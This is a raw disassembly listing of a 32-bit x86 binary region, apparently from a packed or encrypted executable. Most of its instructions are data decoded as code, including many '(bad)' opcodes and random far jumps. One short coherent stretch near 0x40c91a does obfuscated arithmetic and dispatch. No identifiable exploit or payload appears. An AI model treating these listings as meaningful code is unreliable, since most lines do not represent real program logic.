  40c6d2:	shr    BYTE PTR [ecx+ebp*8-0x3],1
  40c6d6:	and    DWORD PTR [edi],esp
  40c6d8:	stos   BYTE PTR es:[edi],al
  40c6d9:	jg     0x40c6ed
  40c6db:	and    eax,0xbf9dea0
  40c6e0:	dec    edx
  40c6e1:	es push edx
  40c6e3:	bound  edx,QWORD PTR ds:0xa7e47f46
  40c6e9:	or     al,0x3b
  40c6eb:	(bad)  
  40c6ed:	sub    eax,0x2d81aced
  40c6f2:	dec    edi
  40c6f3:	dec    esp
  40c6f4:	out    0xda,al
  40c6f6:	stc    
  40c6f7:	shr    BYTE PTR [esi+edi*4-0x4],1
  40c6fb:	enter  0xedeb,0xfe
  40c6ff:	inc    ecx
  40c700:	mov    edi,0x58c1f8c6
  40c705:	fild   WORD PTR [ebx-0x7a7ffb73]
  40c70b:	call   0xd183:0x5aa4604
  40c712:	and    eax,0x930cba94
  40c717:	pop    es
  40c718:	dec    edx
  40c719:	add    al,0x60
  40c71b:	mov    edi,0x62dae657
  40c720:	sbb    al,cl
  40c722:	xchg   edx,eax
  40c723:	add    al,0x9d
  40c725:	mov    al,0x94
  40c727:	les    esi,FWORD PTR [ebp-0x78]
  40c72a:	jl     0x40c76a
  40c72c:	loop   0x40c74b
  40c72e:	push   ecx
  40c72f:	sub    esp,DWORD PTR [eax+0x4d]
  40c732:	push   edx
  40c733:	adc    ch,BYTE PTR [edi-0x504693ac]
  40c739:	mov    edi,0x588db123
  40c73e:	xchg   ebx,eax
  40c73f:	xchg   esi,eax
  40c740:	(bad)  
  40c741:	jmp    0xbe2891fd
  40c746:	sub    al,0xa1
  40c748:	mov    ebx,0xd58931d
  40c74d:	call   0xc4bf:0x146f2727
  40c754:	pop    ecx
  40c755:	data16 in al,0x8c
  40c758:	loop   0x40c7a1
  40c75a:	dec    ebp
  40c75b:	cmp    cl,BYTE PTR [edi]
  40c75d:	stos   DWORD PTR es:[edi],eax
  40c75e:	stos   BYTE PTR es:[edi],al
  40c75f:	inc    edi
  40c760:	push   0xffffffb6
  40c762:	into   
  40c763:	push   eax
  40c764:	push   ds
  40c765:	and    edi,0x281232cf
  40c76b:	jb     0x40c7ea
  40c76d:	mov    WORD PTR [ebx+0x44d9aeb4],?
  40c773:	push   ebp
  40c774:	push   edx
  40c775:	pop    es
  40c776:	repnz sbb cl,BYTE PTR [ebx+eax*1+0x1722fdca]
  40c77e:	pop    edi
  40c77f:	push   ds
  40c780:	(bad)  
  40c782:	mov    ah,0xb2
  40c784:	add    eax,0x3b315903
  40c789:	mov    dh,0x60
  40c78b:	arpl   WORD PTR [edx+0x60c6f047],bp
  40c791:	repz or DWORD PTR [eax-0x44],esi
  40c795:	retf   0xfb22
  40c798:	or     DWORD PTR [ecx-0x750c2182],ebp
  40c79e:	jb     0x40c72c
  40c7a0:	repz push eax
  40c7a2:	sar    BYTE PTR [ecx+0x1ca098f0],0xff
  40c7a9:	jns    0x40c7bc
  40c7ab:	add    ah,BYTE PTR [edx-0x5688cae4]
  40c7b1:	lods   al,BYTE PTR ds:[esi]
  40c7b2:	and    BYTE PTR [ecx],al
  40c7b4:	push   ss
  40c7b5:	inc    esi
  40c7b6:	mov    WORD PTR [edi+0x28dd7e45],gs
  40c7bc:	stc    
  40c7bd:	addr16 mov cl,0x79
  40c7c0:	(bad)  
  40c7c1:	outs   dx,BYTE PTR ds:[esi]
  40c7c2:	pop    edi
  40c7c3:	mov    ss,WORD PTR [edx-0x24]
  40c7c6:	inc    ebp
  40c7c7:	jmp    0xfad0c003
  40c7cc:	lock in al,dx
  40c7ce:	mov    dl,0xac
  40c7d0:	iret   
  40c7d1:	xchg   ebx,eax
  40c7d2:	mov    ch,0xfa
  40c7d4:	shl    BYTE PTR [ebp+ebp*2-0x204befd],cl
  40c7db:	pop    eax
  40c7dc:	test   al,0x3c
  40c7de:	or     eax,DWORD PTR [ebp+0x64f0e869]
  40c7e4:	and    eax,0xac62fdc5
  40c7e9:	fs mov edi,0x70de8ef1
  40c7ef:	jmp    0xfc805719
  40c7f4:	or     ebp,DWORD PTR [ecx+0x1da08c36]
  40c7fa:	adc    bl,BYTE PTR [edi-0x1a]
  40c7fd:	cwde   
  40c7fe:	nop
  40c7ff:	push   ecx
  40c800:	sbb    eax,0x4960af7a
  40c805:	xchg   edx,eax
  40c806:	xor    BYTE PTR [ebx-0x68efe5e9],ch
  40c80c:	popa   
  40c80d:	aaa    
  40c80e:	dec    edx
  40c80f:	ror    BYTE PTR [ebx-0x66a1575f],cl
  40c815:	or     eax,DWORD PTR [eax+0x67ed5cb]
  40c81b:	adc    al,0x9
  40c81d:	imul   edx,DWORD PTR ds:0x3ab5707e,0x8de1eccb
  40c827:	xchg   ebp,eax
  40c828:	repnz (bad) 
  40c82a:	das    
  40c82b:	add    ecx,DWORD PTR [ebp+0x41]
  40c82e:	jmp    0x40c801
  40c830:	cmp    dl,BYTE PTR [eax+0x52ac4e23]
  40c836:	fdivr  DWORD PTR ds:0x1d7a3057
  40c83c:	or     bl,BYTE PTR [edx-0x61a06568]
  40c842:	icebp  
  40c843:	sbb    edx,esp
  40c845:	jg     0x40c7f9
  40c847:	cmp    eax,0xd076b6b9
  40c84c:	cld    
  40c84d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c84e:	pop    esi
  40c84f:	enter  0x8bf9,0xe9
  40c853:	cmp    eax,0x4614677a
  40c858:	pop    edi
  40c859:	es scas eax,DWORD PTR es:[edi]
  40c85b:	pop    es
  40c85c:	lea    edi,[ebp-0x4c]
  40c85f:	shl    BYTE PTR [edi],cl
  40c861:	push   cs
  40c862:	daa    
  40c863:	sbb    BYTE PTR [ecx],0x5
  40c866:	mov    ?,eax
  40c868:	arpl   WORD PTR [ebp+0x7d],dx
  40c86b:	push   esi
  40c86c:	daa    
  40c86d:	push   ebx
  40c86e:	repnz scas eax,DWORD PTR es:[edi]
  40c870:	mov    bl,0x48
  40c872:	sbb    BYTE PTR [ecx],ch
  40c874:	scas   al,BYTE PTR es:[edi]
  40c875:	jno    0x40c821
  40c877:	lods   al,BYTE PTR ds:[esi]
  40c878:	mov    dl,bh
  40c87a:	fstp   TBYTE PTR [edi+0x47]
  40c87d:	outs   dx,DWORD PTR ds:[esi]
  40c87e:	pushf  
  40c87f:	outs   dx,BYTE PTR ds:[esi]
  40c880:	and    BYTE PTR [edi],dh
  40c882:	rcr    DWORD PTR [esi],0x28
  40c885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c886:	inc    ebp
  40c887:	add    BYTE PTR [edi-0x153da8f3],dl
  40c88d:	(bad)  
  40c88e:	rol    cl,cl
  40c890:	fadd   st(3),st
  40c892:	mov    cs,WORD PTR [ebp+0x28043ad2]
  40c898:	in     eax,0xb9
  40c89a:	jnp    0x40c917
  40c89c:	push   ebx
  40c89d:	stos   BYTE PTR es:[edi],al
  40c89e:	fsubr  st,st(4)
  40c8a0:	sub    bh,BYTE PTR [ecx]
  40c8a2:	add    edx,esp
  40c8a4:	xor    eax,0xaf7320bf
  40c8a9:	sub    cl,bl
  40c8ab:	sub    edi,esp
  40c8ad:	or     eax,0xec0c7c50
  40c8b2:	sahf   
  40c8b3:	or     ch,BYTE PTR [eax]
  40c8b5:	cli    
  40c8b6:	(bad)  
  40c8b7:	arpl   WORD PTR [ecx],cx
  40c8b9:	aad    0x4f
  40c8bb:	popf   
  40c8bc:	iret   
  40c8bd:	mov    bl,0xb9
  40c8bf:	push   ecx
  40c8c0:	mov    ds:0x93a2078e,eax
  40c8c5:	jae    0x40c90b
  40c8c7:	(bad)  [eax+eiz*2+0x25]
  40c8cb:	shr    edx,cl
  40c8cd:	repnz cmp DWORD PTR [ebx+0x6b],0xffffff94
  40c8d2:	and    BYTE PTR [eax+0x37],dl
  40c8d5:	add    ch,BYTE PTR fs:[edx]
  40c8d8:	int    0xaf
  40c8da:	cs cld 
  40c8dc:	retf   
  40c8dd:	dec    ecx
  40c8de:	cs dec ebx
  40c8e0:	inc    edx
  40c8e1:	inc    eax
  40c8e2:	xchg   edi,eax
  40c8e3:	push   cs
  40c8e4:	mov    WORD PTR [eax-0x9f411cd],es
  40c8ea:	add    al,0x25
  40c8ec:	(bad)  
  40c8ed:	push   edx
  40c8ee:	outs   dx,DWORD PTR ds:[esi]
  40c8ef:	retf   0xf2ef
  40c8f2:	push   edx
  40c8f3:	dec    esp
  40c8f4:	xor    al,0x27
  40c8f6:	inc    ebx
  40c8f7:	std    
  40c8f8:	in     eax,0x6d
  40c8fa:	icebp  
  40c8fb:	lods   eax,DWORD PTR ds:[esi]
  40c8fc:	xchg   ebx,eax
  40c8fd:	outs   dx,BYTE PTR ds:[esi]
  40c8fe:	jno    0x40c8ad
  40c900:	or     al,0x90
  40c902:	cs jo  0x40c8fc
  40c905:	push   ebx
  40c906:	fnstcw WORD PTR [esi]
  40c908:	cmc    
  40c909:	ret    
  40c90a:	pop    eax
  40c90b:	clc    
  40c90c:	pop    ds
  40c90d:	xchg   esi,eax
  40c90e:	out    dx,al
  40c90f:	jp     0x40c8a8
  40c911:	daa    
  40c912:	adc    bl,BYTE PTR [edi+ebx*8]
  40c915:	cmp    eax,0xd2c3dce5
  40c91a:	mov    eax,DWORD PTR [ebp-0x20]
  40c91d:	mov    edx,DWORD PTR [ebp-0x8]
  40c920:	mov    edi,DWORD PTR [ebp-0x24]
  40c923:	xor    edx,ecx
  40c925:	add    edx,esi
  40c927:	imul   edx,edi
  40c92a:	sub    DWORD PTR [eax],edx
  40c92c:	mov    eax,DWORD PTR [ebp-0x14]
  40c92f:	jmp    0x40b5ea
  40c934:	mov    eax,DWORD PTR [ebp-0xc]
  40c937:	mov    edx,DWORD PTR [ebp-0x18]
  40c93a:	xor    eax,edx
  40c93c:	cmp    eax,0x7a0d5426
  40c941:	je     0x40b5e7
  40c947:	mov    eax,DWORD PTR [ebp-0x10]
  40c94a:	add    DWORD PTR [eax],0x7403502
  40c950:	jmp    0x40b5e7
  40c955:	mov    eax,DWORD PTR [ebp-0x1c]
  40c958:	jmp    0x40cc71
  40c95d:	rol    ebx,cl
  40c95f:	(bad)
  40c962:	leave  
  40c963:	rcr    ebx,1
  40c965:	mov    al,ds:0x1d4c5e53
  40c96a:	mov    edx,0x9d326046
  40c96f:	js     0x40c9e9
  40c971:	je     0x40c9f1
  40c973:	js     0x40c9ed
  40c975:	pop    es
  40c976:	or     eax,0x33daaa3b
  40c97b:	xchg   ecx,eax
  40c97c:	(bad)  
  40c97d:	retf   0xa65b
  40c980:	inc    esi
  40c981:	xchg   esp,eax
  40c982:	cmp    bh,BYTE PTR [esi-0x59]
  40c985:	(bad)  
  40c986:	jl     0x40c946
  40c988:	jnp    0x40c9e1
  40c98a:	mov    edx,DWORD PTR [ebx-0x4aada110]
  40c990:	dec    ebx
  40c991:	imul   ecx,DWORD PTR [ebp-0x6112becc],0x46
  40c998:	cmp    al,0xe
  40c99a:	sbb    cl,0x3
  40c99d:	std    
  40c99e:	(bad)  
  40c99f:	hlt    
  40c9a0:	repz cdq 
  40c9a2:	mov    al,0x25
  40c9a4:	jl     0x40ca1a
  40c9a6:	(bad)  
  40c9a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9a8:	arpl   WORD PTR [eax],si
  40c9aa:	je     0x40c9bb
  40c9ac:	cs pop ecx
  40c9ae:	ret    
  40c9af:	hlt    
  40c9b0:	mov    WORD PTR [edx],ss
  40c9b2:	icebp  
  40c9b3:	jg     0x40c969
  40c9b5:	ret    0xa990
  40c9b8:	mov    cl,0x17
  40c9ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9bb:	jge    0x40ca2c
  40c9bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9be:	enter  0x11cd,0x26
  40c9c2:	imul   ebx,DWORD PTR [esp+edx*1+0x14e26a01],0xffffffc9
  40c9ca:	inc    ebx
  40c9cb:	mov    ?,ecx
  40c9cd:	mov    WORD PTR [edx],cs
  40c9cf:	jb     0x40ca27
  40c9d1:	lds    ebp,FWORD PTR [edx-0xb805a2d]
  40c9d7:	les    esp,FWORD PTR [ecx]
  40c9d9:	jns    0x40ca1b
  40c9db:	mov    al,0xca
  40c9dd:	or     al,0xdd
  40c9df:	inc    edx
  40c9e0:	mov    ebp,0xc0b0cafb
  40c9e5:	or     DWORD PTR [edx],esp
  40c9e7:	stc    
  40c9e8:	sub    ch,BYTE PTR [ecx]
  40c9ea:	add    eax,0x50f87f32
  40c9ef:	pop    ebx
  40c9f0:	mov    ds,WORD PTR [eax+0x4191d080]
  40c9f6:	fist   WORD PTR [ecx+esi*2+0x65]
  40c9fa:	adc    BYTE PTR [eax],ch
  40c9fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9fd:	mov    esp,0x2493f8c1
  40ca02:	jbe    0x40c9fb
  40ca04:	out    0xc1,al
  40ca06:	adc    eax,0x3b3d0b99
  40ca0b:	and    al,0x75
  40ca0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca0e:	js     0x40ca71
  40ca10:	xor    edx,esp
  40ca12:	test   ah,al
  40ca14:	das    
  40ca15:	or     al,0x2f
  40ca17:	ficom  WORD PTR [esi-0x147bf7da]
  40ca1d:	data16 je 0x40c9ba
  40ca20:	test   al,0x44
  40ca22:	or     eax,0xdd813e0f
  40ca27:	sub    al,0x3b
  40ca29:	out    0xb3,al
  40ca2b:	sbb    DWORD PTR [edx],esi
  40ca2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca2e:	adc    bl,bh
  40ca30:	pop    ss
  40ca31:	sbb    edi,DWORD PTR [edx+ecx*4-0x67]
  40ca35:	pop    edx
  40ca36:	xor    BYTE PTR [esi-0x74],0x46
  40ca3a:	iret   
  40ca3b:	dec    esi
  40ca3c:	jmp    0x40ca0e
  40ca3e:	sub    bh,BYTE PTR [esi]
  40ca40:	xchg   ecx,eax
  40ca41:	mov    ecx,0xf0e99cb0
  40ca46:	call   0xbbda4b39
  40ca4b:	std    
  40ca4c:	pushf  
  40ca4d:	outs   dx,DWORD PTR ds:[esi]
  40ca4e:	mov    al,ds:0x2559e84f
  40ca53:	ud0    ebx,DWORD PTR [ebx+0x10]
  40ca57:	outs   dx,BYTE PTR ds:[esi]
  40ca58:	shl    al,cl
  40ca5a:	and    edi,edi
  40ca5c:	out    dx,eax
  40ca5d:	gs inc edi
  40ca5f:	adc    edx,eax
  40ca61:	fidiv  WORD PTR ds:0xa0e188e0
  40ca67:	mov    bl,BYTE PTR [ebx]
  40ca69:	mov    bh,0xe0
  40ca6b:	cmc    
  40ca6c:	xchg   ebx,eax
  40ca6d:	and    bh,dl
  40ca6f:	sbb    esi,DWORD PTR [esi+0x67df766a]
  40ca75:	adc    edi,edi
  40ca77:	repnz bound ebp,QWORD PTR [esi-0x2f]
  40ca7b:	dec    edi
  40ca7c:	dec    ecx
  40ca7d:	out    0xad,al
  40ca7f:	idiv   DWORD PTR [edi-0x1c]
  40ca82:	(bad)  
  40ca83:	loope  0x40ca17
  40ca85:	rcl    BYTE PTR [ecx-0x197d2c6b],0xc
  40ca8c:	test   dh,bl
  40ca8e:	(bad)  
  40ca8f:	add    BYTE PTR [edx-0x69cb14b],0x47
  40ca96:	mov    ecx,0x1aa86ee
  40ca9b:	sbb    eax,0x6e7d778e
  40caa0:	outs   dx,DWORD PTR ds:[esi]
  40caa1:	lds    ecx,FWORD PTR [ebx+ecx*4]
  40caa4:	push   ebx
  40caa5:	and    esp,DWORD PTR [esi-0x258e0acf]
  40caab:	test   al,0x6
  40caad:	jp     0x40cb01
  40caaf:	sbb    BYTE PTR [esi+0x49],0x1c
  40cab3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cab4:	in     al,0x31
  40cab6:	test   al,0xb8
  40cab8:	sub    eax,0xe432f259
  40cabd:	sbb    DWORD PTR [edx-0x3eeb75a8],ecx
  40cac3:	jb     0x40cb1e
  40cac5:	cli    
  40cac6:	jmp    0x40cae2
  40cac8:	stos   BYTE PTR es:[edi],al
  40cac9:	js     0x40ca89
  40cacb:	or     BYTE PTR [edi],ch
  40cacd:	call   0x8b02:0xc8884b2d
  40cad4:	mov    BYTE PTR [ebx-0x54],ch
  40cad7:	scas   eax,DWORD PTR es:[edi]
  40cad8:	and    eax,0x41b55a08
  40cadd:	dec    ebp
  40cade:	fisub  WORD PTR [eax]
  40cae0:	(bad)  
  40cae1:	cli    
  40cae2:	retf   0x431a
  40cae5:	neg    DWORD PTR [edx+0xa]
  40cae8:	mov    cl,0x81
  40caea:	in     eax,0x6c
  40caec:	xor    BYTE PTR [ebx],cl
  40caee:	(bad)  
  40caef:	cmp    bl,BYTE PTR [edi-0x42e9e363]
  40caf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40caf6:	inc    eax
  40caf7:	adc    ch,ah
  40caf9:	push   0x140d49f7
  40cafe:	cmp    DWORD PTR [edi+ecx*2],0xffffff9d
  40cb02:	xor    DWORD PTR [edi+0x27ba64f6],0x945f091d
  40cb0c:	pop    esp
  40cb0d:	xchg   esi,eax
  40cb0e:	jle    0x40cb1f
  40cb10:	and    ah,BYTE PTR [ebp-0x7d]
  40cb13:	aaa    
  40cb14:	push   ebx
  40cb15:	add    al,0xed
  40cb17:	jo     0x40cb5c
  40cb19:	test   al,0x5a
  40cb1b:	mov    esp,0x45030584
  40cb20:	test   al,0x6e
  40cb22:	mov    eax,DWORD PTR [esi+0x55]
  40cb25:	or     al,0xe7
  40cb27:	in     al,0xf
  40cb29:	lock popa 
  40cb2b:	and    DWORD PTR [edx],ebp
  40cb2d:	add    ecx,DWORD PTR [ebx-0x7995b857]
  40cb33:	xchg   ecx,eax
  40cb34:	(bad)  
  40cb35:	push   edi
  40cb36:	repnz hlt 
  40cb38:	ds mov esi,0xae46868d
  40cb3e:	daa    
  40cb3f:	(bad)  [ebx-0x6ee97805]
  40cb45:	lods   eax,DWORD PTR ds:[esi]
  40cb46:	and    cl,BYTE PTR [esi]
  40cb48:	push   esi
  40cb49:	rcr    al,1
  40cb4b:	iret   
  40cb4c:	cwde   
  40cb4d:	xor    ebx,esp
  40cb4f:	ja     0x40cad8
  40cb51:	pusha  
  40cb52:	sbb    bh,BYTE PTR [esi+0x45]
  40cb55:	or     cl,dh
  40cb57:	aas    
  40cb58:	jns    0x40caf2
  40cb5a:	call   0x8ed563a1
  40cb5f:	int3   
  40cb60:	fdivr  QWORD PTR [edi+0x2ca9ad82]
  40cb66:	sbb    cl,0xe3
  40cb69:	out    dx,eax
  40cb6a:	add    al,0x81
  40cb6c:	dec    ebp
  40cb6d:	out    dx,al
  40cb6e:	and    BYTE PTR [esi-0x7650aede],ah
  40cb74:	cdq    
  40cb75:	sub    BYTE PTR [edi-0x69c34889],al
  40cb7b:	mov    al,ds:0x4dac2873
  40cb80:	enter  0x43d9,0xcf
  40cb84:	mov    al,ds:0xb942a192
  40cb89:	push   es
  40cb8a:	dec    esp
  40cb8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb8c:	aaa    
  40cb8d:	mov    BYTE PTR [ebp+0x1ab49fe8],cl
  40cb93:	and    esi,0x8ba2a5a2
  40cb99:	jno    0x40cbaf
  40cb9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb9c:	loope  0x40cb90
  40cb9e:	mov    BYTE PTR [eax],dh
  40cba0:	dec    eax
  40cba1:	icebp  
  40cba2:	pop    eax
  40cba3:	jl     0x40cbc6
  40cba5:	xchg   DWORD PTR [edx-0x32c985cb],esp
  40cbab:	inc    esi
  40cbac:	push   ss
  40cbad:	xchg   ebx,eax
  40cbae:	scas   al,BYTE PTR es:[edi]
  40cbaf:	int3   
  40cbb0:	test   eax,0x4013f655
  40cbb5:	push   eax
  40cbb6:	push   edx
  40cbb7:	sti    
  40cbb8:	aaa    
  40cbb9:	daa    
  40cbba:	(bad)  
  40cbbb:	pop    eax
  40cbbc:	loopne 0x40cb7e
  40cbbe:	scas   al,BYTE PTR es:[edi]
  40cbbf:	ja     0x40cb6d
  40cbc1:	dec    ecx
  40cbc2:	pop    edi
  40cbc3:	mov    ?,WORD PTR [eax+eax*8+0x45]
  40cbc7:	sahf   
  40cbc8:	sbb    BYTE PTR [esi-0x3e],ch
  40cbcb:	iret   
  40cbcc:	pusha  
  40cbcd:	sbb    esp,DWORD PTR [esp+esi*8+0x6b]
  40cbd1:	fld    TBYTE PTR [ebx+0x1d]
  40cbd4:	add    BYTE PTR [edi+0x3],cl
  40cbd7:	(bad)  
  40cbd8:	and    eax,0xb56ef60e
  40cbdd:	ret    0x9168
  40cbe0:	pop    ebx
  40cbe1:	repz fild DWORD PTR [ecx]
  40cbe4:	leave  
  40cbe5:	out    dx,eax
  40cbe6:	dec    esi
  40cbe7:	and    ebp,ebp
  40cbe9:	xchg   DWORD PTR [eax],ecx
  40cbeb:	retf   0x9d73
  40cbee:	pop    es
  40cbef:	jo     0x40cc21
  40cbf1:	aam    0x2c
  40cbf3:	test   BYTE PTR [ecx-0x6ad243ae],al
  40cbf9:	(bad)  
  40cbfa:	jmp    0x920f5101
  40cbff:	aaa    
  40cc00:	arpl   WORD PTR [ebx],sp
  40cc02:	xor    DWORD PTR [ebp*8-0x59774be3],esp
  40cc09:	xchg   edi,eax
  40cc0a:	add    DWORD PTR [edi-0x20ce3b69],ebx
  40cc10:	or     BYTE PTR [edi],ch
  40cc12:	xchg   ebp,eax
  40cc13:	lods   eax,DWORD PTR ds:[esi]
  40cc14:	fst    QWORD PTR [ecx+0x62]
  40cc17:	mov    eax,0x1bd3e344
  40cc1c:	bound  esi,QWORD PTR [edx+ebp*4+0x74]
  40cc20:	cld    
  40cc21:	inc    esi
  40cc22:	loop   0x40cbee
  40cc24:	jbe    0x40cc70
  40cc26:	nop
  40cc27:	retf   
  40cc28:	fist   WORD PTR [ebp+0x2d3ff993]
  40cc2e:	jne    0x40cc1e
  40cc30:	aam    0xba
  40cc32:	push   ds
  40cc33:	jmp    0x9519:0x5cd9c187
  40cc3a:	arpl   WORD PTR [eax+eax*2-0x42f84a81],cx
  40cc41:	mov    esp,0x9ac5276c
  40cc46:	test   eax,0x9fef349f
  40cc4b:	stos   BYTE PTR es:[edi],al
  40cc4c:	(bad)  
  40cc4d:	mov    esi,0xdad998b0
  40cc52:	mul    DWORD PTR [esi+0x5f]
  40cc55:	push   esi
  40cc56:	dec    esi
  40cc57:	adc    eax,0x885ecd03
  40cc5c:	cdq    
  40cc5d:	das    
  40cc5e:	ss jno 0x40cbeb
  40cc61:	ja     0x40cc0c
  40cc63:	sub    DWORD PTR [ebp-0x10],0xffffff87
  40cc67:	test   DWORD PTR [ecx+0x9],edi
  40cc6a:	aad    0x5b
  40cc6c:	addr16 test al,dl
  40cc6f:	into   
  40cc70:	cmp    DWORD PTR [bx+si],edi
  40cc73:	jmp    0x40cf8c
  40cc78:	(bad)  
  40cc79:	(bad)  
  40cc7a:	rol    esp,1
  40cc7c:	ror    ebx,1
  40cc7e:	aad    0xda
  40cc80:	xchg   esi,eax
  40cc81:	mov    dl,0x71
  40cc83:	aad    0x1a
  40cc85:	(bad)  
  40cc86:	mul    ebp
  40cc88:	mov    cs:0x7e747878,al
  40cc8e:	js     0x40cd08
  40cc90:	push   ds
  40cc91:	push   esp
  40cc92:	rol    al,0x93
  40cc95:	inc    ebx
  40cc96:	(bad)  
  40cc97:	xor    al,bh
  40cc99:	cmp    eax,0x8fd8fce9
  40cc9e:	add    eax,0x32f9ef3
  40cca3:	pop    ss
  40cca4:	inc    edi
  40cca5:	dec    esp
  40cca6:	mov    edi,DWORD PTR [ebx+ebx*2+0x6549b815]
  40ccad:	adc    dl,al
  40ccaf:	rcr    DWORD PTR [eax+0x4b],cl
  40ccb2:	adc    DWORD PTR [ebx+0x74cd3c95],edx
  40ccb8:	ror    DWORD PTR [ecx+0x5a],0x91
  40ccbc:	xchg   esi,eax
  40ccbd:	mov    eax,0x6213e880
  40ccc2:	and    eax,0x60cff27c
  40ccc7:	ins    DWORD PTR es:[edi],dx
  40ccc8:	pop    ebp
  40ccc9:	xor    eax,0x8cc640ec
  40ccce:	sti    
  40cccf:	call   0x8b9d5e01
  40ccd4:	adc    al,0x76
  40ccd6:	and    al,0x2f
  40ccd8:	mov    cl,0xbc
  40ccda:	sbb    al,0x89
  40ccdc:	jbe    0x40ccf1
  40ccde:	xchg   edx,eax
  40ccdf:	aaa    
  40cce0:	xor    al,BYTE PTR [ebp-0x660e8bcc]
  40cce6:	push   ebx
  40cce7:	dec    ebp
  40cce8:	in     eax,0xb9
  40ccea:	jge    0x40cc91
  40ccec:	imul   edi,DWORD PTR [ecx],0x62acc1c6
  40ccf2:	(bad)  
  40ccf3:	popf   
  40ccf4:	icebp  
  40ccf5:	or     dl,ah
  40ccf7:	ds push ss
  40ccf9:	out    0xba,eax
  40ccfb:	in     al,dx
  40ccfc:	sub    al,0x43
  40ccfe:	pop    eax
  40ccff:	hlt    
  40cd00:	jle    0x40cccb
  40cd02:	xor    esi,DWORD PTR [ebx+edi*1-0x26f78a32]
  40cd09:	mov    esp,0xdeeb88f2
  40cd0e:	xchg   ebx,eax
  40cd0f:	mov    ebx,0x7fe81c66
  40cd14:	mov    gs,WORD PTR [eax-0x72545e1b]
  40cd1a:	mov    BYTE PTR [ecx-0x57c2a1ae],bl
  40cd20:	loope  0x40cd32
  40cd22:	(bad)  
  40cd23:	xor    dh,BYTE PTR [eax-0x2f]
  40cd26:	test   eax,0xed5d4620
  40cd2b:	int3   
  40cd2c:	ins    DWORD PTR es:[edi],dx
  40cd2d:	es jmp 0xf488:0xa0c2435
  40cd35:	not    BYTE PTR [ebx-0x19]
  40cd38:	aad    0xc1
  40cd3a:	bound  edi,QWORD PTR [edi]
  40cd3c:	xchg   esp,eax
  40cd3d:	mov    esi,0xc2708538
  40cd42:	pusha  
  40cd43:	mov    ah,0x94
  40cd45:	jmp    0xf1b7:0x5a62b860
  40cd4c:	cmp    BYTE PTR [edi],cl
  40cd4e:	iret   
  40cd4f:	popa   
  40cd50:	aad    0xc3
  40cd52:	xchg   esp,eax
  40cd53:	xchg   BYTE PTR [edx],dl
  40cd55:	sbb    al,0x7d
  40cd57:	push   0x32
  40cd59:	jge    0x40cd38
  40cd5b:	push   0xd2ef9557
  40cd60:	pop    eax
  40cd61:	adc    DWORD PTR [edi-0x12],ebx
  40cd64:	pop    edx
  40cd65:	mov    al,0x2c
  40cd67:	mov    dl,0xf8
  40cd69:	int    0xed
  40cd6b:	fist   WORD PTR [ecx]
  40cd6d:	dec    esp
  40cd6e:	shr    DWORD PTR [eax-0x75f0ddf2],1
  40cd74:	jl     0x40cdbc
  40cd76:	sbb    eax,0x163910d7
  40cd7b:	mov    eax,eax
  40cd7d:	mov    ebx,0x62654969
  40cd82:	pop    ecx
  40cd83:	gs push cs
  40cd85:	imul   edx,DWORD PTR [ecx],0xd1af5c63
  40cd8b:	neg    al
  40cd8d:	xchg   esp,eax
  40cd8e:	iret   
  40cd8f:	mov    dh,0x50
  40cd91:	mov    ch,0x94
  40cd93:	bound  ecx,QWORD PTR [esi-0x23f0205f]
  40cd99:	dec    ebp
  40cd9a:	xor    ch,cl
  40cd9c:	xchg   BYTE PTR [ebx],cl
  40cd9e:	lock add bl,cl
  40cda1:	xchg   DWORD PTR es:[eax-0x1fc62828],edx
  40cda8:	cmp    DWORD PTR [esi],ecx
  40cdaa:	jge    0x40ce23
  40cdac:	cs gs (bad) 
  40cdaf:	(bad)  
  40cdb0:	in     eax,0x80
  40cdb2:	stc    
  40cdb3:	js     0x40cd5c
  40cdb5:	ins    DWORD PTR es:[edi],dx
  40cdb6:	push   ds
  40cdb7:	out    0xc3,eax
  40cdb9:	and    dh,BYTE PTR [ebx+0x7435598a]
  40cdbf:	cdq    
  40cdc0:	sbb    al,ch
  40cdc2:	mov    ebx,0xb9e503eb
  40cdc7:	das    
  40cdc8:	fiadd  WORD PTR [ebx-0x72]
  40cdcb:	popa   
  40cdcc:	cwde   
  40cdcd:	test   eax,0xe23075f7
  40cdd2:	or     DWORD PTR [eax-0x370891d],edi
  40cdd8:	pop    ebp
  40cdd9:	shr    BYTE PTR [ebx-0x16],cl
  40cddc:	not    BYTE PTR [eax+0x7565fe77]
  40cde2:	inc    edi
  40cde3:	push   0x70
  40cde5:	scas   al,BYTE PTR es:[edi]
  40cde6:	call   0xbf95:0xb7c5de5e
  40cded:	add    BYTE PTR [ebp+0x4befe0fe],cl
  40cdf3:	mov    bh,BYTE PTR [ecx-0x131fabd7]
  40cdf9:	test   al,0x60
  40cdfb:	icebp  
  40cdfc:	sti    
  40cdfd:	sbb    al,0x70
  40cdff:	pop    ss
  40ce00:	mov    ah,0x2d
  40ce02:	cld    
  40ce03:	test   eax,0xb72f189a
  40ce08:	jbe    0x40cddc
  40ce0a:	mov    DWORD PTR [esi+0x34],eax
  40ce0d:	je     0x40ce81
  40ce0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce10:	pushf  
  40ce11:	adc    ah,dl
  40ce13:	mov    bl,0x57
  40ce15:	mov    edi,DWORD PTR [esi+0x7]
  40ce18:	pushf  
  40ce19:	ffreep st(2)
  40ce1b:	inc    esp
  40ce1c:	inc    esp
  40ce1d:	push   ss
  40ce1e:	xlat   BYTE PTR ds:[ebx]
  40ce1f:	cli    
  40ce20:	(bad)  [esi+0x57]
  40ce24:	rcl    DWORD PTR [eax-0xc],cl
  40ce27:	out    dx,al
  40ce28:	jbe    0x40cdae
  40ce2a:	and    BYTE PTR [edi+0x7d],al
  40ce2d:	push   eax
  40ce2e:	(bad)  
  40ce2f:	jo     0x40cdb5
